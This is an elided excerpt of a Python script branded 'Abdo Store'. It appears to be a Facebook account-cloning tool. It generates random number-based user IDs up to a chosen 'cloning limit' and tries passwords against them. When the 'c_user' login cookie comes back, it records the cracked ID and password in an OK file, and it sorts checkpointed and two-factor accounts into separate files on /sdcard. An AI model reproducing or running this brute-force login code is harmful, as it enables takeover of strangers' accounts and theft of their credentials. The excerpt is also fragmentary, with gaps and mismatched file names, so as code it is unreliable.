...
print("")
print(f"{BLUE} PUT YOUR NAME LIKE , Abdo Store, ,  ")
...
def XYZ():
    ...
    clear()
    print('           \x1b[97m[\033[37;41m  M [ Abdo Store ]  \033[0;m] ')
    print(f'{BLUE}══════════════════════════════════════════════════')
...
def passx():
    os.system("clear")
    print(logo)
    print('           \x1b[97m[\033[37;41m  Abdo Store   \033[0;m] ')
    print("")
...
def pass1():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  Abdo Store   \033[0;m]")
    print(f"")
    linex()
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/Abdo Store-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/HAMII-CP.txt')
...
def pass2():
    ...
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  L I [ Abdo Store ]  \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
...
def pass3():
    ...
    print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/HAMII-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Abdo Store-CP.txt')
    input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");XYZ()
...
def freeq(uid,pwx,tl):
    ...
    'accept-language': 'en-US,en;q=0.9',}
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/Abdo Store-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/Abdo Store-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                  ...
                  #  os.system("play-audio HAMII_CP.mp3")
                    ...
                    open('/sdcard/Abdo Store-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[Abdo Store 🔥] [%s] \33[1;97m[OK:%s{hamill2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
